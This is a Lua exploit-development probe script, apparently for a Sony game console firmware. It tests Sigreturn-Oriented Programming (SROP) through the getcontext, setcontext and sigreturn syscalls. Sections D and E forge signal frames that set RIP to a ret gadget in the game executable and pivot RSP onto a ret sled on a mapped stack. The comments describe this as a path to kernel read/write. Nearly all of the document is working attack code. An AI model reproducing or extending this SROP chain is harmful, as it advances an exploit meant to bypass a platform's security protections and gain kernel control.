-- CRASH_CLASS: HIGH (sections C/D will change execution context → likely process death)
-- PROBE 81a: SROP — sigreturn(417) / getcontext(421) / setcontext(422)
--
-- Context: Sigreturn-Oriented Programming (SROP) is a classic exploit technique.
-- sigreturn(417) resolves OK (probe 22) but was NEVER CALLED — probe 22 skipped it
-- saying "it would crash." getcontext(421) and setcontext(422) exist in the 13.60
-- sysent table but have ZERO probe coverage.
--
-- If set_mcontext() on 14.10 doesn't force SEL_RPL_MASK (as the 13.60 decompile
-- suggests), then sigreturn/setcontext give us:
--   1. Controlled RIP → eboot gadgets
--   2. Controlled RSP → GPU mmap ROP chain
--   3. Controlled RDI/RSI/RDX/RCX/R8/R9 → syscall arguments
--   4. Full SROP primitive → arbitrary syscalls without needing the chain infrastructure
--
-- This is potentially THE path to kernel R/W: craft a fake signal frame, call
-- sigreturn, land in a gadget chain that calls a kernel function.
--
-- Sections (change TEST_SECTION before each run):
--   A: getcontext(421) — harvest live registers. ZERO crash risk.
--   B: Dump the harvested ucontext — find CS/SS/RFLAGS offsets empirically
--   C: setcontext(422) with same context — test if it returns/works
--   D: sigreturn(417) with crafted ucontext pointing to ret gadget
--   E: setcontext(422) with RIP=ret gadget, RSP=GPU mmap (SROP proof)

local TEST_SECTION = "A"

print("=== PROBE 81a: SROP — SIGRETURN / GETCONTEXT / SETCONTEXT ===")
print("TEST_SECTION=" .. TEST_SECTION)
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X_%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

local sc_getpid = make_syscall(20)
local sc_getcontext = make_syscall(421)
local sc_setcontext = make_syscall(422)
local sc_sigreturn = make_syscall(417)
local sc_mmap = make_syscall(477)

local function canary()
    local ok, pid = pcall(function() return sc_getpid():tonumber() end)
    return ok, pid
end

local alive_ok, pid = canary()
print("[0] canary pid=" .. tostring(pid))

-- Get eboot base for gadgets
local info = memory.alloc(0x200)
zero(info, 0x200)
wd(info, 0x160)
local sc_info = make_syscall(593)
pcall(function() sc_info(uint64(0), info) end)
local text_lo = rd(info + 0x108)
local text_hi = rd(info + 0x10C)
local eboot_base = uint64(string.format("0x%X%08X", text_hi or 0, text_lo or 0))
print("[0] eboot base=" .. q(eboot_base))
local ret_gadget = eboot_base + 0x42

-- ==============================
-- SECTION A: getcontext(421) — harvest live registers
-- ==============================
if TEST_SECTION == "A" then
    print("")
    print("=== SECTION A: getcontext(421) — HARVEST LIVE REGISTERS ===")
    print("[A] This syscall should fill a ucontext_t with the current thread's state")
    print("[A] Zero crash risk — just reads current context")
    print("")

    -- ucontext_t is ~0x500 bytes on FreeBSD amd64
    local UCT_SIZE = 0x600
    local ctx = memory.alloc(UCT_SIZE)
    zero(ctx, UCT_SIZE)

    -- Write a magic marker to detect if anything was written
    for off = 0, UCT_SIZE - 4, 4 do
        wd(ctx + off, 0xDEADBEEF)
    end

    print("[A] calling getcontext(421) with buf=" .. q(ctx))
    local ok_gc, rv_gc = pcall(function()
        return sc_getcontext(uint64(ctx))
    end)
    print("[A] getcontext: ok=" .. tostring(ok_gc) .. " rv=" .. tostring(rv_gc))

    -- Check if the buffer was modified
    local first_changed = nil
    local last_changed = nil
    local changed_count = 0
    for off = 0, UCT_SIZE - 4, 4 do
        local val = rd(ctx + off)
        if val ~= 0xDEADBEEF then
            changed_count = changed_count + 1
            if not first_changed then first_changed = off end
            last_changed = off
        end
    end
    print("[A] buffer modified: " .. changed_count .. " dwords changed")
    print("[A] first change at +0x" .. string.format("%X", first_changed or 0))
    print("[A] last change at +0x" .. string.format("%X", last_changed or 0))

    -- Full qword dump of the interesting region
    print("")
    print("[A] FULL QWORD DUMP (ctx+0x00 to ctx+0x180):")
    for off = 0, 0x178, 8 do
        local val = rq(ctx + off)
        local vh, vl = get_hi_lo(val)
        local tag = ""
        if vh == 0xDEADBEEF and vl == 0xDEADBEEF then
            tag = " (untouched)"
        elseif vh >= 0xFFFF8000 then
            tag = " *** KERNEL POINTER! ***"
        elseif val and (vl == 0x43 or vl == 0x3B or vl == 0x202 or vl == 0x10206 or vl == 0x10246) then
            tag = " *** CANDIDATE CS/SS/RFLAGS ***"
        end
        print(string.format("  +0x%03X: %s%s", off, q(val), tag))
    end

    -- Also dump the extended region for mc_len and FPU state
    print("")
    print("[A] EXTENDED DUMP (ctx+0x100 to ctx+0x130):")
    for off = 0x100, 0x128, 8 do
        local val = rq(ctx + off)
        local vh, vl = get_hi_lo(val)
        local tag = ""
        if vl == 0x480 then tag = " *** MC_LEN=0x480! ***" end
        print(string.format("  +0x%03X: %s%s", off, q(val), tag))
    end

    -- Scan for known selector values
    print("")
    print("[A] SCANNING FOR CS=0x43, SS=0x3B, RFLAGS patterns:")
    for off = 0, 0x180, 8 do
        local val = rq(ctx + off)
        if val then
            local vh, vl = get_hi_lo(val)
            if vl == 0x43 and vh == 0 then
                print(string.format("  +0x%03X: CS=0x43 FOUND!", off))
            elseif vl == 0x3B and vh == 0 then
                print(string.format("  +0x%03X: SS=0x3B FOUND!", off))
            elseif (vl == 0x202 or vl == 0x10202 or vl == 0x10206 or vl == 0x10246) and vh == 0 then
                print(string.format("  +0x%03X: RFLAGS=%s FOUND!", off, q(val)))
            end
        end
    end

    local c1_ok, c1_pid = canary()
    print("")
    print("[A] canary: ok=" .. tostring(c1_ok) .. " pid=" .. tostring(c1_pid))

    if c1_ok then
        print("[A] *** getcontext(421) WORKS! Process alive! ***")
        print("[A] Use the dump above to identify CS/SS/RFLAGS offsets for sections C-E")
    end

-- ==============================
-- SECTION B: Deeper analysis — compare with known FreeBSD layout
-- ==============================
elseif TEST_SECTION == "B" then
    print("")
    print("=== SECTION B: getcontext + FreeBSD LAYOUT COMPARISON ===")

    local UCT_SIZE = 0x600
    local ctx = memory.alloc(UCT_SIZE)
    zero(ctx, UCT_SIZE)

    local ok_gc, rv_gc = pcall(function()
        return sc_getcontext(uint64(ctx))
    end)
    print("[B] getcontext: ok=" .. tostring(ok_gc) .. " rv=" .. tostring(rv_gc))

    if not ok_gc or to_num(rv_gc) ~= 0 then
        print("[B] getcontext failed, trying alternative: make_syscall(78) (getmcontext)")
        local sc_78 = make_syscall(78)
        ok_gc, rv_gc = pcall(function() return sc_78(uint64(ctx)) end)
        print("[B] sys 78: ok=" .. tostring(ok_gc) .. " rv=" .. tostring(rv_gc))
    end

    -- FreeBSD amd64 ucontext_t layout:
    -- +0x00: uc_sigmask (sigset_t, 16 bytes)
    -- +0x10: uc_mcontext (struct mcontext)
    --   mcontext at +0x10:
    --     +0x00 (ctx+0x10): mc_onstack
    --     +0x08 (ctx+0x18): mc_rdi
    --     +0x10 (ctx+0x20): mc_rsi
    --     +0x18 (ctx+0x28): mc_rdx
    --     +0x20 (ctx+0x30): mc_rbx
    --     +0x28 (ctx+0x38): mc_rcx
    --     +0x30 (ctx+0x40): mc_rax
    --     +0x38 (ctx+0x48): mc_r8
    --     +0x40 (ctx+0x50): mc_r9
    --     +0x48 (ctx+0x58): mc_r10
    --     +0x50 (ctx+0x60): mc_r11
    --     +0x58 (ctx+0x68): mc_r12
    --     +0x60 (ctx+0x70): mc_r13
    --     +0x68 (ctx+0x78): mc_r14
    --     +0x70 (ctx+0x80): mc_r15
    --     +0x78 (ctx+0x88): mc_trapno
    --     +0x80 (ctx+0x90): mc_fs
    --     +0x88 (ctx+0x98): mc_gs
    --     +0x90 (ctx+0xA0): mc_addr / mc_err
    --     +0x98 (ctx+0xA8): mc_rip
    --     +0xA0 (ctx+0xB0): mc_cs         ← THE KEY FIELD
    --     +0xA8 (ctx+0xB8): mc_rflags
    --     +0xB0 (ctx+0xC0): mc_rsp
    --     +0xB8 (ctx+0xC8): mc_ss         ← THE KEY FIELD
    --     +0xC0 (ctx+0xD0): mc_len (0x480)
    --     +0xC8 (ctx+0xD8): mc_fpformat
    --     +0xD0 (ctx+0xE0): mc_ownedfp
    --     +0xD8 (ctx+0xE8): mc_fpstate[0] (start of 512-byte FPU save area)

    -- BUT: The 13.60 decompile (THR_CREATE_PANIC_PATH) has DIFFERENT offsets:
    -- ctx+0xC0 → tf_cs, ctx+0xE0 → tf_rip, ctx+0xF8 → tf_rsp, ctx+0x100 → tf_ss
    -- This suggests Sony's mcontext layout is DIFFERENT from vanilla FreeBSD.
    -- Two hypotheses:
    --   H1: Sony added fields before mc_rip (shifts everything)
    --   H2: Sony's ucontext has a different uc_mcontext offset

    -- Let's check BOTH layouts by looking for known values
    print("")
    print("[B] === VANILLA FreeBSD LAYOUT (mcontext at ctx+0x10) ===")
    local labels_vanilla = {
        [0xA8] = "mc_rip",  [0xB0] = "mc_cs", [0xB8] = "mc_rflags",
        [0xC0] = "mc_rsp",  [0xC8] = "mc_ss", [0xD0] = "mc_len",
    }
    for _, off in ipairs({0xA8, 0xB0, 0xB8, 0xC0, 0xC8, 0xD0}) do
        local val = rq(ctx + off)
        local vh, vl = get_hi_lo(val)
        local tag = ""
        if labels_vanilla[off] == "mc_cs" and vl == 0x43 then tag = " *** CS=0x43 CONFIRMED! ***"
        elseif labels_vanilla[off] == "mc_ss" and vl == 0x3B then tag = " *** SS=0x3B CONFIRMED! ***"
        elseif labels_vanilla[off] == "mc_len" and vl == 0x480 then tag = " *** MC_LEN=0x480 CONFIRMED! ***"
        elseif labels_vanilla[off] == "mc_rflags" and (vl == 0x202 or vl == 0x10202 or vl == 0x10246) then tag = " *** RFLAGS! ***"
        end
        print(string.format("  ctx+0x%03X (%s): %s%s", off, labels_vanilla[off] or "?", q(val), tag))
    end

    -- 13.60 decompile layout (from THR_CREATE_PANIC_PATH_13.60.md)
    print("")
    print("[B] === SONY 13.60 LAYOUT (from decompile) ===")
    local labels_sony = {
        [0xC0] = "tf_cs(13.60)", [0xE0] = "tf_rip(13.60)", [0xF8] = "tf_rsp(13.60)",
        [0x100] = "tf_ss(13.60)", [0x118] = "mc_len(13.60)",
    }
    for _, off in ipairs({0xC0, 0xE0, 0xF8, 0x100, 0x118}) do
        local val = rq(ctx + off)
        local vh, vl = get_hi_lo(val)
        local tag = ""
        if (off == 0xC0) and vl == 0x43 then tag = " *** CS=0x43 CONFIRMED! ***"
        elseif (off == 0x100) and vl == 0x3B then tag = " *** SS=0x3B CONFIRMED! ***"
        elseif (off == 0x118) and vl == 0x480 then tag = " *** MC_LEN=0x480 CONFIRMED! ***"
        end
        print(string.format("  ctx+0x%03X (%s): %s%s", off, labels_sony[off] or "?", q(val), tag))
    end

    -- ALSO check probe 80a's layout (MC_CS at ctx+0x98, from probe 80a)
    print("")
    print("[B] === PROBE 80a LAYOUT (mcontext at ctx+0x10, standard offsets) ===")
    local labels_80a = {
        [0x90] = "mc_rip(80a)", [0x98] = "mc_cs(80a)", [0xA0] = "mc_rflags(80a)",
        [0xA8] = "mc_rsp(80a)", [0xB0] = "mc_ss(80a)", [0x118] = "mc_len(80a)",
    }
    for _, off in ipairs({0x90, 0x98, 0xA0, 0xA8, 0xB0, 0x118}) do
        local val = rq(ctx + off)
        local vh, vl = get_hi_lo(val)
        local tag = ""
        if (off == 0x98) and vl == 0x43 then tag = " *** CS=0x43 CONFIRMED! ***"
        elseif (off == 0xB0) and vl == 0x3B then tag = " *** SS=0x3B CONFIRMED! ***"
        elseif (off == 0x118) and vl == 0x480 then tag = " *** MC_LEN=0x480 CONFIRMED! ***"
        end
        print(string.format("  ctx+0x%03X (%s): %s%s", off, labels_80a[off] or "?", q(val), tag))
    end

    local c2_ok, c2_pid = canary()
    print("")
    print("[B] canary: ok=" .. tostring(c2_ok) .. " pid=" .. tostring(c2_pid))
    print("[B] Use whichever layout shows CS=0x43/SS=0x3B for sections C-E")

-- ==============================
-- SECTION C: setcontext(422) with SAME context (identity test)
-- ==============================
elseif TEST_SECTION == "C" then
    print("")
    print("=== SECTION C: setcontext(422) IDENTITY TEST ===")
    print("[C] Get context, then set it back unchanged. Should be a no-op.")
    print("[C] WARNING: If setcontext works, execution resumes at the saved RIP.")
    print("[C] The make_syscall wrapper may not handle this correctly → possible crash.")
    print("")

    local UCT_SIZE = 0x600
    local ctx = memory.alloc(UCT_SIZE)
    zero(ctx, UCT_SIZE)

    -- First, harvest context
    local ok_gc, rv_gc = pcall(function() return sc_getcontext(uint64(ctx)) end)
    print("[C] getcontext: ok=" .. tostring(ok_gc) .. " rv=" .. tostring(rv_gc))

    if not ok_gc or to_num(rv_gc) ~= 0 then
        print("[C] getcontext failed, cannot proceed")
    else
        -- Write a marker to detect if setcontext "returns" here
        local marker = memory.alloc(8)
        wq(marker, uint64(0))

        print("[C] [BEFORE] setcontext — marker=0")
        print("[C] calling setcontext(422) with same context...")

        local ok_sc, rv_sc = pcall(function()
            return sc_setcontext(uint64(ctx))
        end)
        print("[C] setcontext: ok=" .. tostring(ok_sc) .. " rv=" .. tostring(rv_sc))

        -- If we reach here, either:
        -- 1. setcontext returned -1 (blocked/failed) → just a failed syscall
        -- 2. setcontext succeeded and execution resumed at saved RIP → we're in a weird state
        -- 3. make_syscall handled the context switch somehow

        local c_ok, c_pid = canary()
        print("[C] canary: ok=" .. tostring(c_ok) .. " pid=" .. tostring(c_pid))

        if c_ok then
            print("[C] Process survived setcontext! Check rv for success/failure.")
        end
    end

-- ==============================
-- SECTION D: sigreturn(417) with crafted ucontext
-- ==============================
elseif TEST_SECTION == "D" then
    print("")
    print("=== SECTION D: sigreturn(417) WITH CRAFTED CONTEXT ===")
    print("[D] This is SROP: forge a signal frame, call sigreturn, control all registers.")
    print("[D] We'll set RIP=ret_gadget, RSP=0, CS=0x43, SS=0x3B")
    print("[D] Expected: thread executes ret, pops 0 → faults at RIP=0 → SIGSEGV → process dies")
    print("[D] The point: we CONTROLLED where execution went via sigreturn!")
    print("")

    -- First harvest real context to get baseline values
    local UCT_SIZE = 0x600
    local ctx_real = memory.alloc(UCT_SIZE)
    zero(ctx_real, UCT_SIZE)
    local ok_gc, rv_gc = pcall(function() return sc_getcontext(uint64(ctx_real)) end)
    print("[D] getcontext for baseline: ok=" .. tostring(ok_gc) .. " rv=" .. tostring(rv_gc))

    -- Allocate our SROP frame
    local srop = memory.alloc(UCT_SIZE)

    if ok_gc and to_num(rv_gc) == 0 then
        -- Copy the real context as a base (preserves sigmask, FPU state, etc.)
        for off = 0, UCT_SIZE - 4, 4 do
            local val = rd(ctx_real + off)
            if val then wd(srop + off, val) end
        end
        print("[D] Copied real context as SROP frame base")
    else
        -- If getcontext failed, build from scratch
        zero(srop, UCT_SIZE)
        print("[D] getcontext failed — building SROP frame from scratch")
    end

    -- Now modify the key fields. We'll try ALL THREE layout hypotheses
    -- and set CS/SS/RFLAGS at all candidate offsets. The kernel will
    -- read from whichever offset is correct.

    -- Vanilla FreeBSD layout
    wq(srop + 0xA8, ret_gadget)       -- mc_rip (vanilla)
    wq(srop + 0xB0, uint64(0x43))     -- mc_cs (vanilla)
    wq(srop + 0xB8, uint64(0x202))    -- mc_rflags (vanilla)
    wq(srop + 0xC0, uint64(0))        -- mc_rsp (vanilla) → ret will pop [0] → fault
    wq(srop + 0xC8, uint64(0x3B))     -- mc_ss (vanilla)
    wq(srop + 0xD0, uint64(0x480))    -- mc_len (vanilla)

    -- Sony 13.60 layout (from THR_CREATE_PANIC_PATH)
    wq(srop + 0xC0, uint64(0x43))     -- tf_cs (13.60) — conflicts with vanilla mc_rsp!
    -- Can't set both vanilla and 13.60 without conflicts. Use vanilla as primary.

    -- Probe 80a layout (mcontext at +0x10, standard register order)
    wq(srop + 0x90, ret_gadget)        -- mc_rip (80a)
    wq(srop + 0x98, uint64(0x43))      -- mc_cs (80a)
    wq(srop + 0xA0, uint64(0x202))     -- mc_rflags (80a)
    wq(srop + 0xA8, uint64(0))         -- mc_rsp (80a) — conflicts with vanilla mc_rip!
    wq(srop + 0xB0, uint64(0x3B))      -- mc_ss (80a) — conflicts with vanilla mc_cs!
    wq(srop + 0x118, uint64(0x480))    -- mc_len (80a)

    -- Note: the layout conflicts mean only ONE will be correct on 14.10.
    -- Run section B first to determine the real layout.

    -- Set GPR markers so we can detect which layout the kernel read
    wq(srop + 0x18, uint64(0xAAAA0001))  -- mc_rdi (vanilla) or mc_rdi (80a same offset?)
    wq(srop + 0x40, uint64(0xAAAA0002))  -- mc_rax (vanilla)

    print("[D] SROP frame at " .. q(srop))
    print("[D] Dumping key fields:")
    for _, off in ipairs({0x90, 0x98, 0xA0, 0xA8, 0xB0, 0xB8, 0xC0, 0xC8, 0xD0, 0x118}) do
        print(string.format("  +0x%03X: %s", off, q(rq(srop + off))))
    end

    print("")
    print("[D] [BEFORE] sigreturn(417) — if the process dies with SIGSEGV, SROP WORKS!")
    print("[D] calling sigreturn(417)...")
    local ok_sr, rv_sr = pcall(function()
        return sc_sigreturn(uint64(srop))
    end)
    print("[D] sigreturn: ok=" .. tostring(ok_sr) .. " rv=" .. tostring(rv_sr))

    -- If we reach here:
    -- rv=-1: blocked by kernel (need different frame format)
    -- process died before this line: sigreturn worked, execution went to ret gadget → fault
    local cd_ok, cd_pid = canary()
    print("[D] canary: ok=" .. tostring(cd_ok) .. " pid=" .. tostring(cd_pid))

-- ==============================
-- SECTION E: setcontext(422) + GPU mmap SROP (full controlled execution)
-- ==============================
elseif TEST_SECTION == "E" then
    print("")
    print("=== SECTION E: FULL SROP VIA setcontext(422) ===")
    print("[E] setcontext with RIP=ret gadget, RSP=GPU mmap, all GPRs controlled")
    print("")

    -- Allocate GPU mmap for our controlled stack
    local stack_size = 4 * 0x4000 -- 4 pages
    local ok_mm, stack_base = pcall(function()
        return sc_mmap(uint64(0), uint64(stack_size), uint64(3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    print("[E] GPU mmap stack: ok=" .. tostring(ok_mm) .. " base=" .. q(stack_base))
    if not ok_mm then
        print("[E] mmap failed")
        return
    end

    -- Fill stack with return addresses forming a "ret sled"
    -- Each entry is the ret gadget address → thread slides through rets
    for off = 0, stack_size - 8, 8 do
        wq(stack_base + off, ret_gadget)
    end
    -- Final entry: address 0 → fault after sliding
    wq(stack_base + stack_size - 8, uint64(0))
    print("[E] ret sled: " .. (stack_size / 8) .. " entries at " .. q(stack_base))

    -- Get real context as baseline
    local UCT_SIZE = 0x600
    local ctx_real = memory.alloc(UCT_SIZE)
    zero(ctx_real, UCT_SIZE)
    local ok_gc, rv_gc = pcall(function() return sc_getcontext(uint64(ctx_real)) end)
    print("[E] getcontext: ok=" .. tostring(ok_gc) .. " rv=" .. tostring(rv_gc))

    -- Build SROP frame from real context
    local srop = memory.alloc(UCT_SIZE)
    if ok_gc and to_num(rv_gc) == 0 then
        for off = 0, UCT_SIZE - 4, 4 do
            local val = rd(ctx_real + off)
            if val then wd(srop + off, val) end
        end

        -- Find which layout is correct by checking where CS=0x43 appeared
        -- For now, set ALL candidate offsets (run section B to determine correct one)

        -- Set RIP to ret gadget at all candidate offsets
        wq(srop + 0x90, ret_gadget)   -- 80a layout
        wq(srop + 0xA8, ret_gadget)   -- vanilla layout

        -- Set RSP to GPU mmap stack
        wq(srop + 0xA8, stack_base)   -- 80a layout (overrides vanilla mc_rip!)
        wq(srop + 0xC0, stack_base)   -- vanilla layout

        -- This is the conflict: we can't serve both layouts simultaneously.
        -- The correct approach is: run section B, determine layout, then set only correct offsets.
        -- For this first test, use probe 80a's layout (matches 58e/76d empirical data):
        wq(srop + 0x90, ret_gadget)        -- mc_rip (80a)
        wq(srop + 0x98, uint64(0x43))      -- mc_cs (80a)
        wq(srop + 0xA0, uint64(0x202))     -- mc_rflags (80a)
        wq(srop + 0xA8, stack_base)         -- mc_rsp (80a)
        wq(srop + 0xB0, uint64(0x3B))      -- mc_ss (80a)
        wq(srop + 0x118, uint64(0x480))     -- mc_len (80a)

        -- Set GPR markers
        wq(srop + 0x18, uint64(0xCAFE0001)) -- mc_rdi
        wq(srop + 0x20, uint64(0xCAFE0002)) -- mc_rsi
        wq(srop + 0x28, uint64(0xCAFE0003)) -- mc_rdx

    else
        print("[E] getcontext failed — building from scratch")
        zero(srop, UCT_SIZE)
        wq(srop + 0x90, ret_gadget)
        wq(srop + 0x98, uint64(0x43))
        wq(srop + 0xA0, uint64(0x202))
        wq(srop + 0xA8, stack_base)
        wq(srop + 0xB0, uint64(0x3B))
        wq(srop + 0x118, uint64(0x480))
    end

    print("[E] SROP frame at " .. q(srop))
    print("[E] RIP=" .. q(ret_gadget) .. " RSP=" .. q(stack_base))
    print("")
    print("[E] [BEFORE] setcontext(422) — SROP EXECUTION")
    local ok_sc2, rv_sc2 = pcall(function()
        return sc_setcontext(uint64(srop))
    end)
    print("[E] setcontext: ok=" .. tostring(ok_sc2) .. " rv=" .. tostring(rv_sc2))

    local ce_ok, ce_pid = canary()
    print("[E] canary: ok=" .. tostring(ce_ok) .. " pid=" .. tostring(ce_pid))
    if ce_ok then
        print("[E] Process survived! Check if rv indicates success or failure.")
    end

else
    print("[!] Invalid TEST_SECTION=" .. TEST_SECTION .. " (use A-E)")
end

print("")
print("=== PROBE 81a SECTION " .. TEST_SECTION .. " COMPLETE ===")
print("=== PROBE 81a COMPLETE ===")
